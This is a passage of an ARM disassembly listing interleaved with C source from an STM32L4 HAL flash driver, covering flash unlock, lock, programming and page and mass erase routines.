 80014d4:	3718      	adds	r7, #24
 80014d6:	46bd      	mov	sp, r7
 80014d8:	bd80      	pop	{r7, pc}
 80014da:	bf00      	nop
 80014dc:	2000000c 	.word	0x2000000c
 80014e0:	40022000 	.word	0x40022000

080014e4 <HAL_FLASH_Unlock>:
/**
  * @brief  Unlock the FLASH control register access.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Unlock(void)
{
 80014e4:	b480      	push	{r7}
 80014e6:	b083      	sub	sp, #12
 80014e8:	af00      	add	r7, sp, #0
  HAL_StatusTypeDef status = HAL_OK;
 80014ea:	2300      	movs	r3, #0
 80014ec:	71fb      	strb	r3, [r7, #7]

  if(READ_BIT(FLASH->CR, FLASH_CR_LOCK) != 0U)
 80014ee:	4b0b      	ldr	r3, [pc, #44]	; (800151c <HAL_FLASH_Unlock+0x38>)
 80014f0:	695b      	ldr	r3, [r3, #20]
 80014f2:	2b00      	cmp	r3, #0
 80014f4:	da0b      	bge.n	800150e <HAL_FLASH_Unlock+0x2a>
  {
    /* Authorize the FLASH Registers access */
    WRITE_REG(FLASH->KEYR, FLASH_KEY1);
 80014f6:	4b09      	ldr	r3, [pc, #36]	; (800151c <HAL_FLASH_Unlock+0x38>)
 80014f8:	4a09      	ldr	r2, [pc, #36]	; (8001520 <HAL_FLASH_Unlock+0x3c>)
 80014fa:	609a      	str	r2, [r3, #8]
    WRITE_REG(FLASH->KEYR, FLASH_KEY2);
 80014fc:	4b07      	ldr	r3, [pc, #28]	; (800151c <HAL_FLASH_Unlock+0x38>)
 80014fe:	4a09      	ldr	r2, [pc, #36]	; (8001524 <HAL_FLASH_Unlock+0x40>)
 8001500:	609a      	str	r2, [r3, #8]

    /* Verify Flash is unlocked */
    if(READ_BIT(FLASH->CR, FLASH_CR_LOCK) != 0U)
 8001502:	4b06      	ldr	r3, [pc, #24]	; (800151c <HAL_FLASH_Unlock+0x38>)
 8001504:	695b      	ldr	r3, [r3, #20]
 8001506:	2b00      	cmp	r3, #0
 8001508:	da01      	bge.n	800150e <HAL_FLASH_Unlock+0x2a>
    {
      status = HAL_ERROR;
 800150a:	2301      	movs	r3, #1
 800150c:	71fb      	strb	r3, [r7, #7]
    }
  }

  return status;
 800150e:	79fb      	ldrb	r3, [r7, #7]
}
 8001510:	4618      	mov	r0, r3
 8001512:	370c      	adds	r7, #12
 8001514:	46bd      	mov	sp, r7
 8001516:	f85d 7b04 	ldr.w	r7, [sp], #4
 800151a:	4770      	bx	lr
 800151c:	40022000 	.word	0x40022000
 8001520:	45670123 	.word	0x45670123
 8001524:	cdef89ab 	.word	0xcdef89ab

08001528 <HAL_FLASH_Lock>:
/**
  * @brief  Lock the FLASH control register access.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Lock(void)
{
 8001528:	b480      	push	{r7}
 800152a:	af00      	add	r7, sp, #0
  /* Set the LOCK Bit to lock the FLASH Registers access */
  SET_BIT(FLASH->CR, FLASH_CR_LOCK);
 800152c:	4b05      	ldr	r3, [pc, #20]	; (8001544 <HAL_FLASH_Lock+0x1c>)
 800152e:	695b      	ldr	r3, [r3, #20]
 8001530:	4a04      	ldr	r2, [pc, #16]	; (8001544 <HAL_FLASH_Lock+0x1c>)
 8001532:	f043 4300 	orr.w	r3, r3, #2147483648	; 0x80000000
 8001536:	6153      	str	r3, [r2, #20]

  return HAL_OK;
 8001538:	2300      	movs	r3, #0
}
 800153a:	4618      	mov	r0, r3
 800153c:	46bd      	mov	sp, r7
 800153e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001542:	4770      	bx	lr
 8001544:	40022000 	.word	0x40022000

08001548 <FLASH_WaitForLastOperation>:
  * @brief  Wait for a FLASH operation to complete.
  * @param  Timeout maximum flash operation timeout
  * @retval HAL_StatusTypeDef HAL Status
  */
HAL_StatusTypeDef FLASH_WaitForLastOperation(uint32_t Timeout)
{
 8001548:	b580      	push	{r7, lr}
 800154a:	b084      	sub	sp, #16
 800154c:	af00      	add	r7, sp, #0
 800154e:	6078      	str	r0, [r7, #4]
  /* Wait for the FLASH operation to complete by polling on BUSY flag to be reset.
     Even if the FLASH operation fails, the BUSY flag will be reset and an error
     flag will be set */

  uint32_t tickstart = HAL_GetTick();
 8001550:	f7ff fe1a 	bl	8001188 <HAL_GetTick>
 8001554:	60f8      	str	r0, [r7, #12]
  uint32_t error;

  while(__HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY))
 8001556:	e00d      	b.n	8001574 <FLASH_WaitForLastOperation+0x2c>
  {
    if(Timeout != HAL_MAX_DELAY)
 8001558:	687b      	ldr	r3, [r7, #4]
 800155a:	f1b3 3fff 	cmp.w	r3, #4294967295
 800155e:	d009      	beq.n	8001574 <FLASH_WaitForLastOperation+0x2c>
    {
      if((HAL_GetTick() - tickstart) >= Timeout)
 8001560:	f7ff fe12 	bl	8001188 <HAL_GetTick>
 8001564:	4602      	mov	r2, r0
 8001566:	68fb      	ldr	r3, [r7, #12]
 8001568:	1ad3      	subs	r3, r2, r3
 800156a:	687a      	ldr	r2, [r7, #4]
 800156c:	429a      	cmp	r2, r3
 800156e:	d801      	bhi.n	8001574 <FLASH_WaitForLastOperation+0x2c>
      {
        return HAL_TIMEOUT;
 8001570:	2303      	movs	r3, #3
 8001572:	e036      	b.n	80015e2 <FLASH_WaitForLastOperation+0x9a>
  while(__HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY))
 8001574:	4b1d      	ldr	r3, [pc, #116]	; (80015ec <FLASH_WaitForLastOperation+0xa4>)
 8001576:	691b      	ldr	r3, [r3, #16]
 8001578:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 800157c:	2b00      	cmp	r3, #0
 800157e:	d1eb      	bne.n	8001558 <FLASH_WaitForLastOperation+0x10>
      }
    }
  }

  error = (FLASH->SR & FLASH_FLAG_SR_ERRORS);
 8001580:	4b1a      	ldr	r3, [pc, #104]	; (80015ec <FLASH_WaitForLastOperation+0xa4>)
 8001582:	691a      	ldr	r2, [r3, #16]
 8001584:	4b1a      	ldr	r3, [pc, #104]	; (80015f0 <FLASH_WaitForLastOperation+0xa8>)
 8001586:	4013      	ands	r3, r2
 8001588:	60bb      	str	r3, [r7, #8]

  if(error != 0u)
 800158a:	68bb      	ldr	r3, [r7, #8]
 800158c:	2b00      	cmp	r3, #0
 800158e:	d01e      	beq.n	80015ce <FLASH_WaitForLastOperation+0x86>
  {
    /*Save the error code*/
    pFlash.ErrorCode |= error;
 8001590:	4b18      	ldr	r3, [pc, #96]	; (80015f4 <FLASH_WaitForLastOperation+0xac>)
 8001592:	685a      	ldr	r2, [r3, #4]
 8001594:	68bb      	ldr	r3, [r7, #8]
 8001596:	4313      	orrs	r3, r2
 8001598:	4a16      	ldr	r2, [pc, #88]	; (80015f4 <FLASH_WaitForLastOperation+0xac>)
 800159a:	6053      	str	r3, [r2, #4]

    /* Clear error programming flags */
    __HAL_FLASH_CLEAR_FLAG(error);
 800159c:	68bb      	ldr	r3, [r7, #8]
 800159e:	f003 4340 	and.w	r3, r3, #3221225472	; 0xc0000000
 80015a2:	2b00      	cmp	r3, #0
 80015a4:	d007      	beq.n	80015b6 <FLASH_WaitForLastOperation+0x6e>
 80015a6:	4b11      	ldr	r3, [pc, #68]	; (80015ec <FLASH_WaitForLastOperation+0xa4>)
 80015a8:	699a      	ldr	r2, [r3, #24]
 80015aa:	68bb      	ldr	r3, [r7, #8]
 80015ac:	f003 4340 	and.w	r3, r3, #3221225472	; 0xc0000000
 80015b0:	490e      	ldr	r1, [pc, #56]	; (80015ec <FLASH_WaitForLastOperation+0xa4>)
 80015b2:	4313      	orrs	r3, r2
 80015b4:	618b      	str	r3, [r1, #24]
 80015b6:	68bb      	ldr	r3, [r7, #8]
 80015b8:	f023 4340 	bic.w	r3, r3, #3221225472	; 0xc0000000
 80015bc:	2b00      	cmp	r3, #0
 80015be:	d004      	beq.n	80015ca <FLASH_WaitForLastOperation+0x82>
 80015c0:	4a0a      	ldr	r2, [pc, #40]	; (80015ec <FLASH_WaitForLastOperation+0xa4>)
 80015c2:	68bb      	ldr	r3, [r7, #8]
 80015c4:	f023 4340 	bic.w	r3, r3, #3221225472	; 0xc0000000
 80015c8:	6113      	str	r3, [r2, #16]

    return HAL_ERROR;
 80015ca:	2301      	movs	r3, #1
 80015cc:	e009      	b.n	80015e2 <FLASH_WaitForLastOperation+0x9a>
  }

  /* Check FLASH End of Operation flag  */
  if (__HAL_FLASH_GET_FLAG(FLASH_FLAG_EOP))
 80015ce:	4b07      	ldr	r3, [pc, #28]	; (80015ec <FLASH_WaitForLastOperation+0xa4>)
 80015d0:	691b      	ldr	r3, [r3, #16]
 80015d2:	f003 0301 	and.w	r3, r3, #1
 80015d6:	2b00      	cmp	r3, #0
 80015d8:	d002      	beq.n	80015e0 <FLASH_WaitForLastOperation+0x98>
  {
    /* Clear FLASH End of Operation pending bit */
    __HAL_FLASH_CLEAR_FLAG(FLASH_FLAG_EOP);
 80015da:	4b04      	ldr	r3, [pc, #16]	; (80015ec <FLASH_WaitForLastOperation+0xa4>)
 80015dc:	2201      	movs	r2, #1
 80015de:	611a      	str	r2, [r3, #16]
  }

  /* If there is an error flag set */
  return HAL_OK;
 80015e0:	2300      	movs	r3, #0
}
 80015e2:	4618      	mov	r0, r3
 80015e4:	3710      	adds	r7, #16
 80015e6:	46bd      	mov	sp, r7
 80015e8:	bd80      	pop	{r7, pc}
 80015ea:	bf00      	nop
 80015ec:	40022000 	.word	0x40022000
 80015f0:	0002c3fa 	.word	0x0002c3fa
 80015f4:	2000000c 	.word	0x2000000c

080015f8 <FLASH_Program_DoubleWord>:
  * @param  Address specifies the address to be programmed.
  * @param  Data specifies the data to be programmed.
  * @retval None
  */
static void FLASH_Program_DoubleWord(uint32_t Address, uint64_t Data)
{
 80015f8:	b480      	push	{r7}
 80015fa:	b085      	sub	sp, #20
 80015fc:	af00      	add	r7, sp, #0
 80015fe:	60f8      	str	r0, [r7, #12]
 8001600:	e9c7 2300 	strd	r2, r3, [r7]
  /* Check the parameters */
  assert_param(IS_FLASH_PROGRAM_ADDRESS(Address));

  /* Set PG bit */
  SET_BIT(FLASH->CR, FLASH_CR_PG);
 8001604:	4b0e      	ldr	r3, [pc, #56]	; (8001640 <FLASH_Program_DoubleWord+0x48>)
 8001606:	695b      	ldr	r3, [r3, #20]
 8001608:	4a0d      	ldr	r2, [pc, #52]	; (8001640 <FLASH_Program_DoubleWord+0x48>)
 800160a:	f043 0301 	orr.w	r3, r3, #1
 800160e:	6153      	str	r3, [r2, #20]

  /* Program first word */
  *(__IO uint32_t*)Address = (uint32_t)Data;
 8001610:	68fb      	ldr	r3, [r7, #12]
 8001612:	683a      	ldr	r2, [r7, #0]
 8001614:	601a      	str	r2, [r3, #0]
           so that all instructions following the ISB are fetched from cache or memory,
           after the instruction has been completed.
 */
__STATIC_FORCEINLINE void __ISB(void)
{
  __ASM volatile ("isb 0xF":::"memory");
 8001616:	f3bf 8f6f 	isb	sy
}
 800161a:	bf00      	nop
  /* Barrier to ensure programming is performed in 2 steps, in right order
    (independently of compiler optimization behavior) */
  __ISB();

  /* Program second word */
  *(__IO uint32_t*)(Address+4U) = (uint32_t)(Data >> 32);
 800161c:	e9d7 0100 	ldrd	r0, r1, [r7]
 8001620:	f04f 0200 	mov.w	r2, #0
 8001624:	f04f 0300 	mov.w	r3, #0
 8001628:	000a      	movs	r2, r1
 800162a:	2300      	movs	r3, #0
 800162c:	68f9      	ldr	r1, [r7, #12]
 800162e:	3104      	adds	r1, #4
 8001630:	4613      	mov	r3, r2
 8001632:	600b      	str	r3, [r1, #0]
}
 8001634:	bf00      	nop
 8001636:	3714      	adds	r7, #20
 8001638:	46bd      	mov	sp, r7
 800163a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800163e:	4770      	bx	lr
 8001640:	40022000 	.word	0x40022000

08001644 <FLASH_Program_Fast>:
  * @param  Address specifies the address to be programmed.
  * @param  DataAddress specifies the address where the data are stored.
  * @retval None
  */
static void FLASH_Program_Fast(uint32_t Address, uint32_t DataAddress)
{
 8001644:	b480      	push	{r7}
 8001646:	b089      	sub	sp, #36	; 0x24
 8001648:	af00      	add	r7, sp, #0
 800164a:	6078      	str	r0, [r7, #4]
 800164c:	6039      	str	r1, [r7, #0]
  uint32_t primask_bit;
  uint8_t row_index = (2*FLASH_NB_DOUBLE_WORDS_IN_ROW);
 800164e:	2340      	movs	r3, #64	; 0x40
 8001650:	77fb      	strb	r3, [r7, #31]
  __IO uint32_t *dest_addr = (__IO uint32_t*)Address;
 8001652:	687b      	ldr	r3, [r7, #4]
 8001654:	61bb      	str	r3, [r7, #24]
  __IO uint32_t *src_addr = (__IO uint32_t*)DataAddress;
 8001656:	683b      	ldr	r3, [r7, #0]
 8001658:	617b      	str	r3, [r7, #20]

  /* Check the parameters */
  assert_param(IS_FLASH_MAIN_MEM_ADDRESS(Address));

  /* Set FSTPG bit */
  SET_BIT(FLASH->CR, FLASH_CR_FSTPG);
 800165a:	4b14      	ldr	r3, [pc, #80]	; (80016ac <FLASH_Program_Fast+0x68>)
 800165c:	695b      	ldr	r3, [r3, #20]
 800165e:	4a13      	ldr	r2, [pc, #76]	; (80016ac <FLASH_Program_Fast+0x68>)
 8001660:	f443 2380 	orr.w	r3, r3, #262144	; 0x40000
 8001664:	6153      	str	r3, [r2, #20]
  __ASM volatile ("MRS %0, primask" : "=r" (result) :: "memory");
 8001666:	f3ef 8310 	mrs	r3, PRIMASK
 800166a:	60fb      	str	r3, [r7, #12]
  return(result);
 800166c:	68fb      	ldr	r3, [r7, #12]

  /* Disable interrupts to avoid any interruption during the loop */
  primask_bit = __get_PRIMASK();
 800166e:	613b      	str	r3, [r7, #16]
  __ASM volatile ("cpsid i" : : : "memory");
 8001670:	b672      	cpsid	i
}
 8001672:	bf00      	nop
  __disable_irq();

  /* Program the double word of the row */
  do
  {
    *dest_addr = *src_addr;
 8001674:	697b      	ldr	r3, [r7, #20]
 8001676:	681a      	ldr	r2, [r3, #0]
 8001678:	69bb      	ldr	r3, [r7, #24]
 800167a:	601a      	str	r2, [r3, #0]
    dest_addr++;
 800167c:	69bb      	ldr	r3, [r7, #24]
 800167e:	3304      	adds	r3, #4
 8001680:	61bb      	str	r3, [r7, #24]
    src_addr++;
 8001682:	697b      	ldr	r3, [r7, #20]
 8001684:	3304      	adds	r3, #4
 8001686:	617b      	str	r3, [r7, #20]
    row_index--;
 8001688:	7ffb      	ldrb	r3, [r7, #31]
 800168a:	3b01      	subs	r3, #1
 800168c:	77fb      	strb	r3, [r7, #31]
  } while (row_index != 0U);
 800168e:	7ffb      	ldrb	r3, [r7, #31]
 8001690:	2b00      	cmp	r3, #0
 8001692:	d1ef      	bne.n	8001674 <FLASH_Program_Fast+0x30>
 8001694:	693b      	ldr	r3, [r7, #16]
 8001696:	60bb      	str	r3, [r7, #8]
  __ASM volatile ("MSR primask, %0" : : "r" (priMask) : "memory");
 8001698:	68bb      	ldr	r3, [r7, #8]
 800169a:	f383 8810 	msr	PRIMASK, r3
}
 800169e:	bf00      	nop

  /* Re-enable the interrupts */
  __set_PRIMASK(primask_bit);
}
 80016a0:	bf00      	nop
 80016a2:	3724      	adds	r7, #36	; 0x24
 80016a4:	46bd      	mov	sp, r7
 80016a6:	f85d 7b04 	ldr.w	r7, [sp], #4
 80016aa:	4770      	bx	lr
 80016ac:	40022000 	.word	0x40022000

080016b0 <HAL_FLASHEx_Erase>:
  *         the pages have been correctly erased)
  *
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASHEx_Erase(FLASH_EraseInitTypeDef *pEraseInit, uint32_t *PageError)
{
 80016b0:	b580      	push	{r7, lr}
 80016b2:	b084      	sub	sp, #16
 80016b4:	af00      	add	r7, sp, #0
 80016b6:	6078      	str	r0, [r7, #4]
 80016b8:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef status;
  uint32_t page_index;

  /* Process Locked */
  __HAL_LOCK(&pFlash);
 80016ba:	4b48      	ldr	r3, [pc, #288]	; (80017dc <HAL_FLASHEx_Erase+0x12c>)
 80016bc:	781b      	ldrb	r3, [r3, #0]
 80016be:	2b01      	cmp	r3, #1
 80016c0:	d101      	bne.n	80016c6 <HAL_FLASHEx_Erase+0x16>
 80016c2:	2302      	movs	r3, #2
 80016c4:	e085      	b.n	80017d2 <HAL_FLASHEx_Erase+0x122>
 80016c6:	4b45      	ldr	r3, [pc, #276]	; (80017dc <HAL_FLASHEx_Erase+0x12c>)
 80016c8:	2201      	movs	r2, #1
 80016ca:	701a      	strb	r2, [r3, #0]

  /* Check the parameters */
  assert_param(IS_FLASH_TYPEERASE(pEraseInit->TypeErase));

  /* Wait for last operation to be completed */
  status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 80016cc:	f24c 3050 	movw	r0, #50000	; 0xc350
 80016d0:	f7ff ff3a 	bl	8001548 <FLASH_WaitForLastOperation>
 80016d4:	4603      	mov	r3, r0
 80016d6:	73fb      	strb	r3, [r7, #15]

  if (status == HAL_OK)
 80016d8:	7bfb      	ldrb	r3, [r7, #15]
 80016da:	2b00      	cmp	r3, #0
 80016dc:	d175      	bne.n	80017ca <HAL_FLASHEx_Erase+0x11a>
  {
    pFlash.ErrorCode = HAL_FLASH_ERROR_NONE;
 80016de:	4b3f      	ldr	r3, [pc, #252]	; (80017dc <HAL_FLASHEx_Erase+0x12c>)
 80016e0:	2200      	movs	r2, #0
 80016e2:	605a      	str	r2, [r3, #4]

    /* Deactivate the cache if they are activated to avoid data misbehavior */
    if(READ_BIT(FLASH->ACR, FLASH_ACR_ICEN) != 0U)
 80016e4:	4b3e      	ldr	r3, [pc, #248]	; (80017e0 <HAL_FLASHEx_Erase+0x130>)
 80016e6:	681b      	ldr	r3, [r3, #0]
 80016e8:	f403 7300 	and.w	r3, r3, #512	; 0x200
 80016ec:	2b00      	cmp	r3, #0
 80016ee:	d013      	beq.n	8001718 <HAL_FLASHEx_Erase+0x68>
    {
      if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 80016f0:	4b3b      	ldr	r3, [pc, #236]	; (80017e0 <HAL_FLASHEx_Erase+0x130>)
 80016f2:	681b      	ldr	r3, [r3, #0]
 80016f4:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 80016f8:	2b00      	cmp	r3, #0
 80016fa:	d009      	beq.n	8001710 <HAL_FLASHEx_Erase+0x60>
      {
        /* Disable data cache  */
        __HAL_FLASH_DATA_CACHE_DISABLE();
 80016fc:	4b38      	ldr	r3, [pc, #224]	; (80017e0 <HAL_FLASHEx_Erase+0x130>)
 80016fe:	681b      	ldr	r3, [r3, #0]
 8001700:	4a37      	ldr	r2, [pc, #220]	; (80017e0 <HAL_FLASHEx_Erase+0x130>)
 8001702:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 8001706:	6013      	str	r3, [r2, #0]
        pFlash.CacheToReactivate = FLASH_CACHE_ICACHE_DCACHE_ENABLED;
 8001708:	4b34      	ldr	r3, [pc, #208]	; (80017dc <HAL_FLASHEx_Erase+0x12c>)
 800170a:	2203      	movs	r2, #3
 800170c:	771a      	strb	r2, [r3, #28]
 800170e:	e016      	b.n	800173e <HAL_FLASHEx_Erase+0x8e>
      }
      else
      {
        pFlash.CacheToReactivate = FLASH_CACHE_ICACHE_ENABLED;
 8001710:	4b32      	ldr	r3, [pc, #200]	; (80017dc <HAL_FLASHEx_Erase+0x12c>)
 8001712:	2201      	movs	r2, #1
 8001714:	771a      	strb	r2, [r3, #28]
 8001716:	e012      	b.n	800173e <HAL_FLASHEx_Erase+0x8e>
      }
    }
    else if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 8001718:	4b31      	ldr	r3, [pc, #196]	; (80017e0 <HAL_FLASHEx_Erase+0x130>)
 800171a:	681b      	ldr	r3, [r3, #0]
 800171c:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8001720:	2b00      	cmp	r3, #0
 8001722:	d009      	beq.n	8001738 <HAL_FLASHEx_Erase+0x88>
    {
      /* Disable data cache  */
      __HAL_FLASH_DATA_CACHE_DISABLE();
 8001724:	4b2e      	ldr	r3, [pc, #184]	; (80017e0 <HAL_FLASHEx_Erase+0x130>)
 8001726:	681b      	ldr	r3, [r3, #0]
 8001728:	4a2d      	ldr	r2, [pc, #180]	; (80017e0 <HAL_FLASHEx_Erase+0x130>)
 800172a:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 800172e:	6013      	str	r3, [r2, #0]
      pFlash.CacheToReactivate = FLASH_CACHE_DCACHE_ENABLED;
 8001730:	4b2a      	ldr	r3, [pc, #168]	; (80017dc <HAL_FLASHEx_Erase+0x12c>)
 8001732:	2202      	movs	r2, #2
 8001734:	771a      	strb	r2, [r3, #28]
 8001736:	e002      	b.n	800173e <HAL_FLASHEx_Erase+0x8e>
    }
    else
    {
      pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 8001738:	4b28      	ldr	r3, [pc, #160]	; (80017dc <HAL_FLASHEx_Erase+0x12c>)
 800173a:	2200      	movs	r2, #0
 800173c:	771a      	strb	r2, [r3, #28]
    }

    if (pEraseInit->TypeErase == FLASH_TYPEERASE_MASSERASE)
 800173e:	687b      	ldr	r3, [r7, #4]
 8001740:	681b      	ldr	r3, [r3, #0]
 8001742:	2b01      	cmp	r3, #1
 8001744:	d111      	bne.n	800176a <HAL_FLASHEx_Erase+0xba>
    {
      /* Mass erase to be done */
      FLASH_MassErase(pEraseInit->Banks);
 8001746:	687b      	ldr	r3, [r7, #4]
 8001748:	685b      	ldr	r3, [r3, #4]
 800174a:	4618      	mov	r0, r3
 800174c:	f000 f84a 	bl	80017e4 <FLASH_MassErase>

      /* Wait for last operation to be completed */
      status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 8001750:	f24c 3050 	movw	r0, #50000	; 0xc350
 8001754:	f7ff fef8 	bl	8001548 <FLASH_WaitForLastOperation>
 8001758:	4603      	mov	r3, r0
 800175a:	73fb      	strb	r3, [r7, #15]
    defined (STM32L4R5xx) || defined (STM32L4R7xx) || defined (STM32L4R9xx) || defined (STM32L4S5xx) || defined (STM32L4S7xx) || defined (STM32L4S9xx)
      /* If the erase operation is completed, disable the MER1 and MER2 Bits */
      CLEAR_BIT(FLASH->CR, (FLASH_CR_MER1 | FLASH_CR_MER2));
#else
      /* If the erase operation is completed, disable the MER1 Bit */
      CLEAR_BIT(FLASH->CR, (FLASH_CR_MER1));
 800175c:	4b20      	ldr	r3, [pc, #128]	; (80017e0 <HAL_FLASHEx_Erase+0x130>)
 800175e:	695b      	ldr	r3, [r3, #20]
 8001760:	4a1f      	ldr	r2, [pc, #124]	; (80017e0 <HAL_FLASHEx_Erase+0x130>)
 8001762:	f023 0304 	bic.w	r3, r3, #4
 8001766:	6153      	str	r3, [r2, #20]
 8001768:	e02d      	b.n	80017c6 <HAL_FLASHEx_Erase+0x116>
#endif
    }
    else
    {
      /*Initialization of PageError variable*/
      *PageError = 0xFFFFFFFFU;
 800176a:	683b      	ldr	r3, [r7, #0]
 800176c:	f04f 32ff 	mov.w	r2, #4294967295
 8001770:	601a      	str	r2, [r3, #0]

      for(page_index = pEraseInit->Page; page_index < (pEraseInit->Page + pEraseInit->NbPages); page_index++)
 8001772:	687b      	ldr	r3, [r7, #4]
 8001774:	689b      	ldr	r3, [r3, #8]
 8001776:	60bb      	str	r3, [r7, #8]
 8001778:	e01d      	b.n	80017b6 <HAL_FLASHEx_Erase+0x106>
      {
        FLASH_PageErase(page_index, pEraseInit->Banks);
 800177a:	687b      	ldr	r3, [r7, #4]
 800177c:	685b      	ldr	r3, [r3, #4]
 800177e:	4619      	mov	r1, r3
 8001780:	68b8      	ldr	r0, [r7, #8]
 8001782:	f000 f84d 	bl	8001820 <FLASH_PageErase>

        /* Wait for last operation to be completed */
        status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 8001786:	f24c 3050 	movw	r0, #50000	; 0xc350
 800178a:	f7ff fedd 	bl	8001548 <FLASH_WaitForLastOperation>
 800178e:	4603      	mov	r3, r0
 8001790:	73fb      	strb	r3, [r7, #15]

        /* If the erase operation is completed, disable the PER Bit */
        CLEAR_BIT(FLASH->CR, (FLASH_CR_PER | FLASH_CR_PNB));
 8001792:	4b13      	ldr	r3, [pc, #76]	; (80017e0 <HAL_FLASHEx_Erase+0x130>)
 8001794:	695b      	ldr	r3, [r3, #20]
 8001796:	4a12      	ldr	r2, [pc, #72]	; (80017e0 <HAL_FLASHEx_Erase+0x130>)
 8001798:	f423 737e 	bic.w	r3, r3, #1016	; 0x3f8
 800179c:	f023 0302 	bic.w	r3, r3, #2
 80017a0:	6153      	str	r3, [r2, #20]

        if (status != HAL_OK)
 80017a2:	7bfb      	ldrb	r3, [r7, #15]
 80017a4:	2b00      	cmp	r3, #0
 80017a6:	d003      	beq.n	80017b0 <HAL_FLASHEx_Erase+0x100>
        {
          /* In case of error, stop erase procedure and return the faulty address */
          *PageError = page_index;
 80017a8:	683b      	ldr	r3, [r7, #0]
 80017aa:	68ba      	ldr	r2, [r7, #8]
 80017ac:	601a      	str	r2, [r3, #0]
          break;
 80017ae:	e00a      	b.n	80017c6 <HAL_FLASHEx_Erase+0x116>
      for(page_index = pEraseInit->Page; page_index < (pEraseInit->Page + pEraseInit->NbPages); page_index++)
 80017b0:	68bb      	ldr	r3, [r7, #8]
 80017b2:	3301      	adds	r3, #1
 80017b4:	60bb      	str	r3, [r7, #8]
 80017b6:	687b      	ldr	r3, [r7, #4]
 80017b8:	689a      	ldr	r2, [r3, #8]
 80017ba:	687b      	ldr	r3, [r7, #4]
 80017bc:	68db      	ldr	r3, [r3, #12]
 80017be:	4413      	add	r3, r2
 80017c0:	68ba      	ldr	r2, [r7, #8]
 80017c2:	429a      	cmp	r2, r3
 80017c4:	d3d9      	bcc.n	800177a <HAL_FLASHEx_Erase+0xca>
        }
      }
    }

    /* Flush the caches to be sure of the data consistency */
    FLASH_FlushCaches();
 80017c6:	f000 f84f 	bl	8001868 <FLASH_FlushCaches>
  }

  /* Process Unlocked */
  __HAL_UNLOCK(&pFlash);
 80017ca:	4b04      	ldr	r3, [pc, #16]	; (80017dc <HAL_FLASHEx_Erase+0x12c>)
 80017cc:	2200      	movs	r2, #0
 80017ce:	701a      	strb	r2, [r3, #0]

  return status;
 80017d0:	7bfb      	ldrb	r3, [r7, #15]
}
 80017d2:	4618      	mov	r0, r3
 80017d4:	3710      	adds	r7, #16
 80017d6:	46bd      	mov	sp, r7
 80017d8:	bd80      	pop	{r7, pc}
 80017da:	bf00      	nop
 80017dc:	2000000c 	.word	0x2000000c
 80017e0:	40022000 	.word	0x40022000

080017e4 <FLASH_MassErase>:
  *            @arg FLASH_BANK_2: Bank2 to be erased
  *            @arg FLASH_BANK_BOTH: Bank1 and Bank2 to be erased
  * @retval None
  */
static void FLASH_MassErase(uint32_t Banks)
{
 80017e4:	b480      	push	{r7}
 80017e6:	b083      	sub	sp, #12
 80017e8:	af00      	add	r7, sp, #0
 80017ea:	6078      	str	r0, [r7, #4]
  {
    /* Check the parameters */
    assert_param(IS_FLASH_BANK(Banks));

    /* Set the Mass Erase Bit for the bank 1 if requested */
    if((Banks & FLASH_BANK_1) != 0U)
 80017ec:	687b      	ldr	r3, [r7, #4]
 80017ee:	f003 0301 	and.w	r3, r3, #1
 80017f2:	2b00      	cmp	r3, #0
 80017f4:	d005      	beq.n	8001802 <FLASH_MassErase+0x1e>
    {
      SET_BIT(FLASH->CR, FLASH_CR_MER1);
 80017f6:	4b09      	ldr	r3, [pc, #36]	; (800181c <FLASH_MassErase+0x38>)
 80017f8:	695b      	ldr	r3, [r3, #20]
 80017fa:	4a08      	ldr	r2, [pc, #32]	; (800181c <FLASH_MassErase+0x38>)
 80017fc:	f043 0304 	orr.w	r3, r3, #4
 8001800:	6153      	str	r3, [r2, #20]
    SET_BIT(FLASH->CR, (FLASH_CR_MER1 | FLASH_CR_MER2));
  }
#endif

  /* Proceed to erase all sectors */
  SET_BIT(FLASH->CR, FLASH_CR_STRT);
 8001802:	4b06      	ldr	r3, [pc, #24]	; (800181c <FLASH_MassErase+0x38>)
 8001804:	695b      	ldr	r3, [r3, #20]
 8001806:	4a05      	ldr	r2, [pc, #20]	; (800181c <FLASH_MassErase+0x38>)
 8001808:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 800180c:	6153      	str	r3, [r2, #20]
}
 800180e:	bf00      	nop
 8001810:	370c      	adds	r7, #12
 8001812:	46bd      	mov	sp, r7
 8001814:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001818:	4770      	bx	lr
 800181a:	bf00      	nop
 800181c:	40022000 	.word	0x40022000

08001820 <FLASH_PageErase>:
  *            @arg FLASH_BANK_1: Page in bank 1 to be erased
  *            @arg FLASH_BANK_2: Page in bank 2 to be erased
  * @retval None
  */
void FLASH_PageErase(uint32_t Page, uint32_t Banks)
{
 8001820:	b480      	push	{r7}
 8001822:	b083      	sub	sp, #12
 8001824:	af00      	add	r7, sp, #0
 8001826:	6078      	str	r0, [r7, #4]
 8001828:	6039      	str	r1, [r7, #0]
  /* Prevent unused argument(s) compilation warning */
  UNUSED(Banks);
#endif

  /* Proceed to erase the page */
  MODIFY_REG(FLASH->CR, FLASH_CR_PNB, ((Page & 0xFFU) << FLASH_CR_PNB_Pos));
 800182a:	4b0e      	ldr	r3, [pc, #56]	; (8001864 <FLASH_PageErase+0x44>)
 800182c:	695b      	ldr	r3, [r3, #20]
 800182e:	f423 727e 	bic.w	r2, r3, #1016	; 0x3f8
 8001832:	687b      	ldr	r3, [r7, #4]
